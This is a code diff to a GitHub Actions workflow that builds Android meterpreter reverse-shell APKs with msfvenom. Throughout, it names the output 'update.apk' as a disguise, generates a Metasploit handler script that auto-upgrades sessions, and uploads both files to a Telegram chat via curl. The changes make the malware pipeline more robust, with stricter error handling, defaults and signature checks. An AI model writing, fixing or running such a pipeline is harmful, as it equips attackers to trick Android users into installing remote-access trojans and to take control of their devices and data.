@@ -28,7 +28,7 @@ on:
         default: "4444"
       filename:
         description: "Output APK name (disguise)"
-        required: true
+        required: false
         default: "update.apk"
       send_rc:
         description: "Also send handler .rc file to Telegram"
@@ -51,6 +51,7 @@ jobs:
       - name: Resolve + validate parameters
         id: p
         run: |
+          set -euo pipefail
           LHOST="${{ github.event.inputs.lhost || secrets.LHOST }}"
           LPORT="${{ github.event.inputs.lport || secrets.LPORT || '4444' }}"
           PAYLOAD="${{ github.event.inputs.payload || 'android/meterpreter/reverse_tcp' }}"
@@ -58,6 +59,9 @@ jobs:
           SEND_RC="${{ github.event.inputs.send_rc || 'true' }}"
 
           [ -z "$LHOST" ] && { echo "::error::LHOST missing"; exit 1; }
+          [ -z "$LPORT" ] && LPORT=4444
+          [ -z "$FNAME" ] && FNAME=update.apk
+          case "$FNAME" in *.apk) ;; *) FNAME="$FNAME.apk" ;; esac
 
           case "$PAYLOAD" in
             android/meterpreter/reverse_tcp|android/meterpreter/reverse_tcp_ssl|\
@@ -77,34 +81,73 @@ jobs:
       - name: Pull Metasploit image
         run: docker pull "$IMAGE"
 
-      - name: Build payload
+      - name: Probe image
         run: |
-          mkdir -p out
-          docker run --rm -v "$PWD/out:/work" "$IMAGE" \
-            ./msfvenom \
-              -p "${{ steps.p.outputs.payload }}" \
-              LHOST="${{ steps.p.outputs.lhost }}" \
-              LPORT="${{ steps.p.outputs.lport }}" \
-              --platform android \
-              -a dalvik \
-              -o "/work/${{ steps.p.outputs.fname }}"
-          ls -lh out/
+          set -euo pipefail
+          docker run --rm --entrypoint bash "$IMAGE" -lc \
+            'ruby -v; java -version 2>&1 | head -1; which jarsigner apksigner zipalign || true'
+
+      - name: Build payload
+        env:
+          PAYLOAD: ${{ steps.p.outputs.payload }}
+          LHOST: ${{ steps.p.outputs.lhost }}
+          LPORT: ${{ steps.p.outputs.lport }}
+          FNAME: ${{ steps.p.outputs.fname }}
+        run: |
+          set -euo pipefail
+          mkdir -p out && chmod 777 out
+
+          if ! docker run --rm \
+                --user "$(id -u):$(id -g)" \
+                -e HOME=/tmp \
+                -w /usr/src/metasploit-framework \
+                -v "$PWD/out:/work" \
+                --entrypoint ./msfvenom \
+                "$IMAGE" \
+                  -p "$PAYLOAD" \
+                  LHOST="$LHOST" \
+                  LPORT="$LPORT" \
+                  --platform android \
+                  -o "/work/$FNAME" 2>&1 | tee /tmp/msfvenom.log; then
+            echo "::error::msfvenom exited non-zero"
+            tail -60 /tmp/msfvenom.log
+            exit 1
+          fi
+
+          ls -la out/
+          test -s "out/$FNAME" || {
+            echo "::error::msfvenom produced no APK"
+            tail -60 /tmp/msfvenom.log
+            exit 1
+          }
 
       - name: Verify APK
+        env:
+          FNAME: ${{ steps.p.outputs.fname }}
         run: |
-          APK="out/${{ steps.p.outputs.fname }}"
-          test -s "$APK" || { echo "::error::APK empty"; exit 1; }
+          set -euo pipefail
+          APK="out/$FNAME"
+          test -s "$APK" || { echo "::error::APK missing"; exit 1; }
           unzip -l "$APK" | grep -q AndroidManifest.xml || { echo "::error::Not a valid APK"; exit 1; }
-          echo "APK OK: $(du -h "$APK" | cut -f1)"
+          if unzip -l "$APK" | grep -Eq 'META-INF/.*\.(RSA|DSA|SF)'; then
+            echo "APK signed: $(du -h "$APK" | cut -f1)"
+          else
+            echo "::warning::APK has no v1 signature — install may fail"
+          fi
 
       - name: Build handler rc
+        env:
+          PAYLOAD: ${{ steps.p.outputs.payload }}
+          LHOST: ${{ steps.p.outputs.lhost }}
+          LPORT: ${{ steps.p.outputs.lport }}
         run: |
-          RC="out/handler-${{ steps.p.outputs.lport }}.rc"
+          set -euo pipefail
+          RC="out/handler-$LPORT.rc"
           {
             echo "use multi/handler"
-            echo "set PAYLOAD ${{ steps.p.outputs.payload }}"
-            echo "set LHOST ${{ steps.p.outputs.lhost }}"
-            echo "set LPORT ${{ steps.p.outputs.lport }}"
+            echo "set PAYLOAD $PAYLOAD"
+            echo "set LHOST $LHOST"
+            echo "set LPORT $LPORT"
             echo "set ExitOnSession false"
             echo "set AutoRunScript post/multi/manage/shell_to_meterpreter"
             echo "exploit -j"
@@ -122,12 +165,21 @@ jobs:
         env:
           TG_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
           TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
+          PAYLOAD: ${{ steps.p.outputs.payload }}
+          LHOST: ${{ steps.p.outputs.lhost }}
+          LPORT: ${{ steps.p.outputs.lport }}
+          FNAME: ${{ steps.p.outputs.fname }}
+          SEND_RC: ${{ steps.p.outputs.send_rc }}
         run: |
-          APK="out/${{ steps.p.outputs.fname }}"
-          RC="out/handler-${{ steps.p.outputs.lport }}.rc"
+          set -euo pipefail
+          [ -n "${TG_TOKEN:-}" ] || { echo "::error::TELEGRAM_BOT_TOKEN secret missing"; exit 1; }
+          [ -n "${TG_CHAT:-}" ]  || { echo "::error::TELEGRAM_CHAT_ID secret missing"; exit 1; }
+
+          APK="out/$FNAME"
+          RC="out/handler-$LPORT.rc"
+          test -s "$APK" || { echo "::error::APK missing"; exit 1; }
           CAPTION=$(printf 'APK ready\npayload: %s\nLHOST: %s\nLPORT: %s\nsize: %s' \
-            "${{ steps.p.outputs.payload }}" "${{ steps.p.outputs.lhost }}" \
-            "${{ steps.p.outputs.lport }}" "$(du -h "$APK" | cut -f1)")
+            "$PAYLOAD" "$LHOST" "$LPORT" "$(du -h "$APK" | cut -f1)")
 
           curl -sS --fail-with-body \
             -F "chat_id=${TG_CHAT}" \
@@ -135,7 +187,7 @@ jobs:
             -F "document=@${APK};type=application/vnd.android.package-archive" \
             "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"
 
-          if [ "${{ steps.p.outputs.send_rc }}" = "true" ]; then
+          if [ "$SEND_RC" = "true" ]; then
             curl -sS --fail-with-body \
               -F "chat_id=${TG_CHAT}" \
               -F "document=@${RC}" \
